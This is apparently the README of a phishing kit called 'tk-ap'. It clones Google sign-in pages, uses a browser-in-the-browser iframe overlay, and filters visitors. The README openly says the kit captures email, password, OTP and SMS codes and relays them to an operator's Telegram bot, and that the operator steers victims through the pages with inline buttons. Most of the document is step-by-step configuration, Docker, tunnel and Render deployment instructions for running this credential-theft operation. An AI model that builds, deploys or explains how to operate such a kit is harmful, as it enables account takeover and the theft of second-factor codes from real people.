# tk-ap

A three-component stack: a static frontend (`fe`), a Node.js Express API (`be`), and a PHP credential-collection app (`googlephish`). The Node backend acts as a Telegram-gated login approval layer; the PHP app mirrors Google sign-in pages and sends captured data to a separate Telegram bot.

---

## Architecture

```
Browser (fe)
  │
  ├── iframe / BITB overlay → googlephish (PHP on :8080 / Docker :80)
  │                               └─ Telegram Bot B (config.json)
  │
  └── REST calls → be (Node on :4000)
                       └─ Telegram Bot A (.env)
```

- **`fe/`** — Plain HTML/CSS/JS frontend. No build step required. Served statically.
- **`be/`** — Express API that receives login submissions, holds them as `pending`, and sends Telegram messages with Approve / Reject / 2FA inline keyboard buttons.
- **`googlephish/`** — PHP pages that clone Google sign-in UI. Captures email, password, and OTP/SMS codes, then pushes them to a Telegram bot. An operator drives the victim through pages via Telegram inline buttons.

---

## Prerequisites

| Tool | Min version |
|------|-------------|
| Node.js | 18 |
| npm / yarn | any modern |
| PHP | 8.0+ (for local dev) |
| Docker | any recent (for PHP container) |

---

## Quick Start

### 1 — Clone and install

```bash
git clone <repo-url> tk-ap
cd tk-ap/be
yarn install        # or: npm install
```

### 2 — Configure the Node backend

```bash
cp be/.env.example be/.env
```

Edit `be/.env`:

```env
PORT=4000

TELEGRAM_BOT_TOKEN=<Bot-A token from @BotFather>
TELEGRAM_ADMIN_CHAT_ID=<your numeric chat/group ID>

# Optional but recommended — see "Setting the Telegram webhook" below
TELEGRAM_WEBHOOK_SECRET=<random string you choose>

# Not enforced in current code, kept for future use
GOOGLE_CLIENT_IDS=
DEMO_USERNAME=admin
DEMO_PASSWORD=changeme

# Informational only — not read by the app
PUBLIC_BASE_URL=https://your-host.example.com
```

### 3 — Configure the PHP app

Edit `googlephish/config.json`:

```json
{
    "afk_mode": false,
    "afk_interval": 5000,
    "telegram_token": "<Bot-B token from @BotFather>",
    "telegram_chat_id": "<operator chat ID>",
    "website_url": "https://your-phphost.example.com",
    "telegram_buttons": true
}
```

`website_url` must point to the public URL where `googlephish` is reachable — the PHP app calls `setWebhook` against `<website_url>/telegram_api.php` on every page load.

### 4 — Configure the frontend

Edit `fe/config.js` to match your deployment URLs:

```js
window.APP_CONFIG = {
    authMode: 'googlephish',
    apiBaseUrl: 'http://localhost:4000',          // be Node server
    googlephishBaseUrl: 'http://localhost:8080',  // PHP server
    bitbEntryPath: '/index.php',
    afterLoginRedirectUrl: 'https://www.google.com',
    // ... other display options
};
```

---

## Running locally

### Node backend (`be`)

```bash
# Development (auto-restart on file changes)
cd be
yarn dev

# Production
yarn start
```

Server starts on `http://localhost:4000` (or `PORT` from `.env`).

### PHP app (`googlephish`) — Docker (recommended)

```bash
cd googlephish
docker build -t googlephish .
docker run --rm -p 8080:80 googlephish
```

PHP app is available at `http://localhost:8080`.

### PHP app — plain PHP built-in server

```bash
cd googlephish
php -S 127.0.0.1:8080
```

### Frontend (`fe`)

Serve `fe/` with any static file server:

```bash
# Using Python
cd fe
python3 -m http.server 3000

# Using npx serve
npx serve fe -l 3000
```

Open `http://localhost:3000`.

---

## Setting the Telegram Webhook (Node bot — Bot A)

The Node backend receives Telegram callback button presses via a webhook. You must register the webhook URL with Telegram once after deployment.

### Step 1 — Expose the backend publicly

For local development, use a tunnel:

```bash
# ngrok
ngrok http 4000
# → https://abc123.ngrok.io
```

For production deployments (e.g. Render, Fly.io), use your public URL.

### Step 2 — Register the webhook

Run this curl command (replace values):

```bash
curl -X POST "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/setWebhook" \
  -H "Content-Type: application/json" \
  -d '{
    "url": "https://abc123.ngrok.io/telegram/webhook",
    "secret_token": "<TELEGRAM_WEBHOOK_SECRET>"
  }'
```

- `url` must be HTTPS and publicly reachable.
- `secret_token` must exactly match `TELEGRAM_WEBHOOK_SECRET` in `be/.env`. If `TELEGRAM_WEBHOOK_SECRET` is empty in `.env`, omit `secret_token` from the request.

### Step 3 — Verify

```bash
curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/getWebhookInfo"
```

Expected response includes `"url": "https://..."` and `"pending_update_count": 0`.

### Removing the webhook (switch back to polling)

```bash
curl "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/deleteWebhook"
```

---

## Setting the Telegram Webhook (PHP bot — Bot B)

The PHP app auto-calls `setWebhook` on every page load using `website_url` + `/telegram_api.php` from `googlephish/config.json`. No manual step is needed beyond ensuring `website_url` is correct and publicly reachable over HTTPS.

---

## API Reference (`be`)

| Method | Path | Description |
|--------|------|-------------|
| `POST` | `/login` | Submit login (Google ID token or username/password). Returns `{ requestId }`. |
| `GET` | `/login-status?requestId=<id>` | Poll for status: `pending` / `approved` / `rejected` / `2fa`. |
| `POST` | `/submit-2fa` | Submit 2FA code `{ requestId, code }`. |
| `POST` | `/telegram/webhook` | Telegram webhook receiver (called by Telegram, not the browser). |
| `GET` | `/health` | Returns `{ ok: true }`. |

---

## Environment Variables Reference

### `be/.env`

| Variable | Required | Description |
|----------|----------|-------------|
| `PORT` | No | HTTP port (default `4000`) |
| `TELEGRAM_BOT_TOKEN` | **Yes** | Bot A token from @BotFather |
| `TELEGRAM_ADMIN_CHAT_ID` | **Yes** | Numeric chat ID to receive approval messages |
| `TELEGRAM_WEBHOOK_SECRET` | No | Secret token for webhook validation (recommended) |
| `GOOGLE_CLIENT_IDS` | No | Comma-separated OAuth client IDs (not enforced currently) |
| `DEMO_USERNAME` | No | Demo login username (not enforced currently) |
| `DEMO_PASSWORD` | No | Demo login password (not enforced currently) |
| `PUBLIC_BASE_URL` | No | Informational note for your webhook URL |

### `googlephish/config.json`

| Key | Description |
|-----|-------------|
| `telegram_token` | Bot B token from @BotFather |
| `telegram_chat_id` | Operator chat ID for PHP bot messages |
| `website_url` | Public base URL of the PHP app (used for `setWebhook`) |
| `telegram_buttons` | Show inline keyboard buttons in Telegram messages (`true`/`false`) |
| `afk_mode` | Pause operator-driven page transitions |
| `afk_interval` | Browser polling interval in ms |

---

## Deployment (Render)

The existing `fe/config.js` points to Render services. Suggested setup:

1. **`be`** — "Web Service", Node 18, build `yarn install`, start `yarn start`. Set env vars in the Render dashboard.
2. **`googlephish`** — "Web Service" with Docker runtime. Use the `googlephish/Dockerfile`. Set `website_url` in `config.json` to the Render service URL before building.
3. **`fe`** — "Static Site", publish directory `fe/`. Update `apiBaseUrl` and `googlephishBaseUrl` in `fe/config.js` before deploying.

After deploying `be`, run the `setWebhook` curl command from the step above to connect Bot A.

---

## Project Structure

```
tk-ap/
├── be/                        # Node.js Express API
│   ├── .env.example
│   ├── package.json
│   ├── server.js
│   └── src/
│       ├── app.js
│       ├── config.js
│       ├── lib/
│       │   ├── clientIp.js
│       │   ├── store.js       # In-memory request store (TTL ~2 min)
│       │   └── telegram.js    # Telegram API wrapper
│       └── routes/
│           ├── health.js
│           ├── login.js
│           └── telegram.js    # Webhook handler
├── fe/                        # Static frontend
│   ├── config.js              # All client-side config lives here
│   ├── index.html
│   ├── main.js
│   ├── style.css
│   └── js/
│       ├── auth-api.js        # Calls be/ REST endpoints
│       ├── auth-ui.js         # UI state machine
│       └── bitb-googlephish.js # BITB iframe overlay
└── googlephish/               # PHP Google sign-in clone
    ├── Dockerfile
    ├── config.json
    ├── include.php             # Session bootstrap, setWebhook, Telegram helpers
    ├── telegram_api.php        # PHP Telegram webhook handler
    ├── index.php               # Email step
    ├── password.php            # Password step
    ├── 2-step.php              # 2-step verification step
    ├── sms.php                 # SMS code step
    ├── process.php             # POST handler / step router
    ├── lib/
    │   └── detector.php        # Visitor filtering
    └── telegram/               # Runtime: per-IP redirect instruction files
```
